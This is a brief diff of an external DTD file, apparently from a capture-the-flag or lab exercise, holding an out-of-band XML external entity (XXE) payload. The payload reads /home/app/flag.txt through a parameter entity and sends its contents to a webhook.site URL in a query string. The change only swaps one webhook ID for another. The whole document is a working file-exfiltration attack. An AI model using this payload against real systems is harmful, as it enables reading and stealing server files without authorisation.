@@ -1,5 +1,5 @@
 <!ENTITY % file SYSTEM "file:///home/app/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/e850e7bf-a92e-488a-9378-0304f6f92200?data=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/9d4a540e-fbe4-4f5e-815d-e04680be4591?data=%file;'>">
 %eval;
 %send;
 <!ENTITY test "beef">
